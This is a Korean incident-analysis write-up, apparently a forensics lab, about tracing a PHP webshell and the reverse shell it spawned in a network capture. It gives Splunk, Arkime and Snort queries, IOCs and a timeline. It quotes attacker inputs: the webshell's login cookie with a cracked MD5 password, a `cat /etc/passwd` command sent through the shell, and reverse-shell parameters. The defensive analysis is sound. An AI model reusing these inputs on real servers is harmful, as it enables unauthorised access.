**쿠키가 중요해요.** `user=ry4wn; pass=5f4dcc3b5aa765d61d8327deb882cf99`는 웹셸 로그인 정보예요. `5f4dcc3b5aa765d61d8327deb882cf99`는 아주 유명한 MD5 해시로, 원래 값은 **`password`**예요. 웹셸 계정이 `ry4wn` / `password`라는 뜻이에요. ry4wn은 서버의 일반 사용자 이름과 같고, DNS의 `ry4wn-pc`와도 같아요. 그래서 .102의 호스트명이 RY4WN-PC일 가능성이 높아요(확정은 아님).

### 5-3. `cmdexe=cat /etc/passwd` 요청 (09:55:04) { #cmdexe }

응답이 `Content-Encoding: gzip`이라서 Arkime 화면에서는 깨져 보여요(`libfile content type: application/x-gzip`). 압축된 HTML이에요. 같은 `/etc/passwd` 내용이 리버스 셸에서 평문으로 보였으니 굳이 풀지 않아도 돼요. 이 요청으로 **웹셸 단계에서 이미 명령 실행이 됐다**는 것만 확인하면 충분해요.

**세션 화면에서 덤으로 보이는 것:**

- MAC 주소: .102 = **90:e6:ba:96:43:32** (ASUSTek), .100 = **6c:0b:84:6a:1d:d8**.
- **IP TTL**: .102가 128, .100이 64예요. 초기 TTL은 윈도우가 128, Linux가 64라서, 윈도우 클라이언트가 Linux 서버를 공격하는 그림과 맞아요.

---

## 6단계 — 초기 침투는 보이나요? { #initial-access }

!!! question "질문: 이니셜 액세스는 안 보이는 건가요?"
    네, 이번 캡처에서는 보이지 않아요. 여기서 초기 침투는 **"minishell.php가 처음에 어떻게 서버에 올라갔나"**예요. 근거는 세 가지예요.

    **1. 웹셸은 캡처 시작 전부터 서버에 있었어요.** .102가 .100:55555에 처음 보낸 요청은 09:53:35 `GET /`이고, 이어서 `/icons/blank.gif`, `folder.gif`, `unknown.gif`, `text.gif`, `tar.gif`를 불러왔어요. **Apache 디렉터리 목록 페이지**의 아이콘이에요(폴더에 index.html이 없으면 Apache가 파일 목록을 보여 줘요). 4초 뒤 `GET /minishell.php`의 Referer가 `http://192.168.1.100:55555/`이에요. **목록 화면에서 클릭해서** 들어간 거예요. 파일이 이미 있었다는 뜻이에요.

    **2. minishell.php를 올리는 트래픽이 없어요.** 서버가 받은 파일은 cerber4.PNG와 작은 폼 데이터뿐이에요. 웹셸을 올린 PUT/POST, FTP, SCP 흔적도 없어요.

    **3. 단서: .100 ↔ .101 SSH 세션**은 캡처 시작 전에 이미 열려 있었어요(OTH). 웹셸을 올린 경로일 수도 있지만 암호화돼 있어서, 보고서에는 "가능성"으로만 적어요.

.100에 목록 페이지보다 먼저 들어온 요청이 없는지 확인해요.

```spl
index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100
| stats min(ts) AS first count BY method uri
| eval first=strftime(first, "%H:%M:%S")
| sort first
| head 5
```

- `stats ... BY method uri`는 메서드와 경로 조합마다 처음 나온 시간과 횟수를 세요.
- **새로 나온 `head 5`**는 결과에서 **맨 위 5줄만** 보여 줘요. 정렬한 다음이라 가장 이른 요청 5개예요.

```text
method  uri                    first     count
GET     /                      09:53:35  1
GET     /favicon.ico           09:53:35  1
GET     /icons/blank.gif       09:53:35  1
GET     /icons/compressed.gif  09:53:35  1
GET     /icons/folder.gif      09:53:35  1
```

첫 요청이 `GET /`이고 그 전에 업로드가 없어요. 웹셸은 **이미 서버에 있었어요.**

!!! question "질문: Wireshark를 쓰면 안 되는데, 목록 페이지의 파일 날짜는 어떻게 보나요?"
    Apache 목록 페이지에는 파일마다 **Last modified(수정 날짜)**가 나와서, minishell.php가 언제 생겼는지 알 수 있어요. 응답이 gzip으로 압축돼 있어서 풀어야 해요. **Arkime + CyberChef**만으로 하는 방법이에요.

    1. Arkime: `ip.src == 192.168.1.102 && ip.dst == 192.168.1.100 && port.dst == 55555 && http.method == GET`으로 검색하고, 09:53:35 세션 중 URI가 `/`인 것을 펼쳐요.
    2. **Packet Options → Show Images & Files**를 켜면 Destination 쪽에 응답 본문 다운로드 링크가 생겨요(헤더 없이 본문만).
    3. CyberChef: 받은 파일을 **Input**에 넣고 Recipe에 **Gunzip**(표로 보려면 **Render HTML** 추가)을 넣은 뒤, `minishell.php` 옆의 날짜를 봐요.

    **링크가 안 생기면:** **Destination Raw**(헤더 + 본문)를 받고, CyberChef **Extract Files**(GZIP 체크)로 gzip 부분만 잘라 내요(gzip 시작 표시 `1f 8b`를 찾아 줘요). 그 파일을 저장해서 다시 **Gunzip**해요.

    이번에는 다운로드가 되지 않아서, 보고서에는 날짜 없이 "Initial access not in capture"로 썼어요.

---

## 7단계 — Snort 룰 하나 { #snort }

```text
alert tcp $HOME_NET any -> $HOME_NET 55555 (msg:"minishell.php webshell access - Sung"; content:"minishell.php"; nocase; sid:1000031; rev:1;)
```

- 내부에서 내부로 가는 트래픽이라 목적지도 `$EXTERNAL_NET`이 아니라 **`$HOME_NET`**이에요.
- `$HOME_NET 55555`는 내부 호스트의 포트 55555(웹 서버)로 가는 패킷이에요.
- `content:"minishell.php"` + `nocase`는 웹셸 이름이 들어간 요청을 대소문자 상관없이 잡아요.
- `sid:1000031; rev:1;`은 룰 번호와 버전이에요.

**웹셸 요청마다 알림이 하나쯤** 나올 거예요(HTTP 목록에 16건). 응답은 포트 55555**에서** 나가는 패킷이라 안 잡혀요. 테스트 방법은 [Night Dew — 8-3](night-dew-hancitor-pony-zeus-panda-tls-c2.md#snort-test)에 있어요.

---

## 타임라인 (2017-01-20, UTC) { #timeline }

| 시간 | 일 |
|---|---|
| 09:53:28 | 캡처 시작 (.100 ↔ .101:22 SSH 세션은 이미 열려 있음) |
| 09:53:35 | .102 → .100:55555 `GET /` — Apache 디렉터리 목록 |
| 09:53:39 | 목록에서 `GET /minishell.php`. 페이지가 82.98.86.178에서 `background.gif`를 불러옴 |
| 09:53:47 | POST `minishell.php` — 웹셸 로그인(`ry4wn`) |
| 09:54:16 / 09:54:47 | `cerber4.PNG` 업로드 (두 번째는 `/tmp`로) |
| 09:55:04 | `cmdexe=cat /etc/passwd` — 웹셸로 명령 실행 |
| 09:55:21–09:55:32 | 웹셸 메뉴: `forbd_dir`, `cookiejack`, `rs` |
| 09:56:05–09:56:42 | 리버스 셸 .100 → .102:4444 — 응답 없음(S0) |
| 09:56:35–09:58:36 | 리버스 셸 .100 → **.101:4444** — 성공, `www-data`, 120초 |
| 09:57:49 | .102의 No-IP DUC 업데이트(`dynupdate.noip[.]com`) — 증거로 이어지지 않음 |
| 09:58:40 | 캡처 끝 |

## IOC { #iocs }

| 종류 | 값 | 설명 |
|---|---|---|
| URL 경로 | 192.168.1.100:55555의 `/minishell.php` | PHP 웹셸 |
| 쿼리 키 | `cmdexe=`, `rev_option=PHP+Reverse+Shell&my_ip=&my_port=`, `cookiejack`, `forbd_dir`, `rs` | minishell 기능 |
| 쿠키 | `user=ry4wn; pass=5f4dcc3b5aa765d61d8327deb882cf99` | 웹셸 로그인(`password`의 MD5) |
| 도메인 / IP | `www.ajithkp560.aaaaaaaa[.]com` / 82.98.86.178 | 웹셸 페이지의 배경 이미지 |
| 파일 | `/tmp/cerber4.PNG` (23,125 B, PNG) | 웹셸로 업로드 |
| 포트 | 서버에서 LAN으로 4444/tcp | 리버스 셸 |

---

## 바로 쓰는 쿼리 모음 { #query-sheet }

**Splunk (Zeek)** — PCAP이 여러 개 들어 있으면 `pcap_case="<case>"`를 추가하세요.

```spl
index=zeek | stats count AS events min(ts) AS first max(ts) AS last BY sourcetype | eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S") | sort - events
index=zeek sourcetype=zeek:conn | where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h) | stats count AS conns dc(id_resp_h) AS dests BY id_orig_h | sort - conns
index=zeek sourcetype=zeek:conn | stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service | eval first=strftime(first, "%H:%M:%S") | sort first | where NOT cidrmatch("192.168.0.0/16", id_resp_h)
index=zeek sourcetype=zeek:dns | stats count values(answers) AS answers min(ts) AS first BY query | eval first=strftime(first, "%H:%M:%S") | sort first
index=zeek sourcetype=zeek:weird | stats count BY name | sort - count
index=zeek sourcetype=zeek:http | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h method host uri status_code user_agent referrer resp_mime_types
index=zeek sourcetype=zeek:conn (id_resp_p=4444 OR id_resp_p=5938) | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_orig_h id_orig_p id_resp_h id_resp_p conn_state orig_bytes resp_bytes duration
index=zeek sourcetype=zeek:conn id_orig_h=192.168.1.100 | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h id_resp_p service conn_state orig_bytes resp_bytes
index=zeek sourcetype=zeek:files rx_hosts=192.168.1.100 | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time tx_hosts rx_hosts mime_type filename seen_bytes md5
index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 | stats min(ts) AS first count BY method uri | eval first=strftime(first, "%H:%M:%S") | sort first | head 5
index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 uri="/minishell.php*"
```

**Arkime**

```text
ip.src == 192.168.1.100 && port.dst == 4444
ip.src == 192.168.1.100 && ip.dst == 192.168.1.101 && port.dst == 4444
ip.dst == 192.168.1.100 && http.method == POST
ip.dst == 192.168.1.100 && http.uri == *cmdexe*
ip.dst == 192.168.1.100 && port.dst == 55555 && http.uri == *minishell.php*
```

**CyberChef**

```text
Gunzip  (→ Render HTML)
Extract Files (GZIP)  →  Gunzip        ← Destination Raw만 받을 수 있을 때
```

**Snort**

```text
alert tcp $HOME_NET any -> $HOME_NET 55555 (msg:"minishell.php webshell access - Sung"; content:"minishell.php"; nocase; sid:1000031; rev:1;)
```

---

## 배운 점 { #lessons }

1. **모든 PCAP이 악성코드 감염은 아니에요.** 이번에는 사람이 브라우저로 웹셸을 조작했어요. "피해자"는 바쁜 PC가 아니라 서버예요.
2. **캡처 방향부터 확인해요.** `possible_split_routing` / `data_before_established` + recv 0 = 한 방향 캡처예요. 유출이 아니에요.
3. **Referer를 읽어요.** 82.98.86.178과 code.jquery가 C2가 아니라 웹셸 페이지의 리소스라는 걸 알려 줬어요.
4. **conn_state가 성공 여부를 알려 줘요.** S0 = 아무도 답하지 않음. SF + 긴 시간 + 작은/큰 바이트 비율 = 실제로 동작한 대화형 셸.
5. **HTTP 요청과 연결을 초 단위로 맞춰요.** 09:56:35의 `my_ip=192.168.1.101` = 09:56:35의 SF 연결.
6. **OTH는 "캡처 전에 시작됨"이에요.** 미리 열려 있던 SSH 세션은 초기 침투의 단서예요.
7. **유명한 해시는 알아 두면 좋아요.** `5f4dcc3b5aa765d61d8327deb882cf99` = `password`의 MD5.
8. **TTL로 OS를 짐작해요.** 128은 윈도우, 64는 Linux.
9. **`cmdexe`는 변수 이름이지 `cmd.exe`가 아니에요.** URL은 `이름=값` 쌍으로 읽어요.
10. **네트워크로 알 수 없는 건 적어 둬요.** 자기 자신으로의 `nc`, 웹셸이 올라간 경로 → 호스트 확인.

## 참고 { #references }

- [BEGUILESOFT — FTP로 유출한 HawkEye](beguilesoft-hawkeye-ftp-exfil.md) (같은 Splunk 베이스라이닝, 한 줄씩 설명)
- [플레이북: 웹셸/서버](../playbooks/webshell-server.md) · [플레이북: 내부 확산](../playbooks/lateral-domain.md)
- [Zeek conn.log](../../network/zeek/conn-log.md) · [http.log](../../network/zeek/http-log.md) · [files.log](../../network/zeek/files-log.md)
- [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md)
- [Night Dew — Snort 테스트 가이드](night-dew-hancitor-pony-zeus-panda-tls-c2.md#snort-test)
